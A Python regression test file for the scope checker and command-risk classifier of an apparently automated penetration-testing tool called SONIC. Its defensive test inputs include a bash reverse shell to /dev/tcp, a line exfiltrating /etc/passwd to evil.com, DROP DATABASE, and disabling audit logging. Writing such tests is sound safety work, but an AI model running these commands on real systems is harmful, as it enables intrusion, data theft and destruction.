"""Regression tests for safety-envelope bugs found during engagement recon.

Reproduces (then verifies fixes for):
  BUG 1 — is_target_in_scope did not expand CIDRs or strip URL hosts, so
          10.10.50.10 against allowed ips ["10.10.50.0/24"] returned False.
  BUG 2 — classify_command_risk did not honor safety_rules.yaml forbidden
          patterns (DROP DATABASE, exfiltrate, disable logging, modify
          safety_rules, reverse shells) — all returned L0.

Author: SONIC toolsmith (engagement self-assessment).
"""
from sonic.safety.scope import ScopeChecker, RiskLevel


def _cfg():
    return {
        "targets": {
            "domains": ["testapp.sonic-lab.local", "*.sonic-lab.local"],
            "ips": ["10.10.50.0/24"],
        },
        "exclusions": {"domains": [], "ips": []},
    }


# ---- BUG 1: CIDR expansion + URL host extraction ----
def test_cidr_member_is_in_scope():
    sc = ScopeChecker()
    assert sc.is_target_in_scope("10.10.50.10", _cfg()) is True
    assert sc.is_target_in_scope("10.10.50.254", _cfg()) is True


def test_cidr_outside_is_out_of_scope():
    sc = ScopeChecker()
    assert sc.is_target_in_scope("10.10.51.1", _cfg()) is False
    assert sc.is_target_in_scope("10.11.50.10", _cfg()) is False


def test_url_host_extracted_for_ip():
    sc = ScopeChecker()
    assert sc.is_target_in_scope("http://10.10.50.10:8080/admin", _cfg()) is True


def test_url_host_extracted_for_domain():
    sc = ScopeChecker()
    assert sc.is_target_in_scope("http://testapp.sonic-lab.local/login", _cfg()) is True
    assert sc.is_target_in_scope("https://api.sonic-lab.local/v1", _cfg()) is True


def test_out_of_scope_url_blocked():
    sc = ScopeChecker()
    assert sc.is_target_in_scope("http://169.254.169.254/", _cfg()) is False
    assert sc.is_target_in_scope("http://192.168.1.1/", _cfg()) is False


# ---- BUG 2: command classifier forbidden parity ----
def test_drop_database_is_l2():
    sc = ScopeChecker()
    assert sc.classify_command_risk("DROP DATABASE prod;") == RiskLevel.L2_FORBIDDEN


def test_exfiltrate_is_l2():
    sc = ScopeChecker()
    assert sc.classify_command_risk("exfiltrate /etc/passwd to evil.com") == RiskLevel.L2_FORBIDDEN


def test_disable_logging_is_l2():
    sc = ScopeChecker()
    assert sc.classify_command_risk("disable audit logging") == RiskLevel.L2_FORBIDDEN


def test_modify_safety_rules_is_l2():
    sc = ScopeChecker()
    assert sc.classify_command_risk("modify safety_rules.yaml") == RiskLevel.L2_FORBIDDEN


def test_reverse_shell_bash_is_l2():
    sc = ScopeChecker()
    assert sc.classify_command_risk("bash -i >& /dev/tcp/10.10.50.5/4444 0>&1") == RiskLevel.L2_FORBIDDEN


def test_safe_recon_still_l0():
    sc = ScopeChecker()
    assert sc.classify_command_risk("curl http://testapp.sonic-lab.local/") == RiskLevel.L0_SAFE
    assert sc.classify_command_risk("nmap -sV 10.10.50.10") == RiskLevel.L0_SAFE
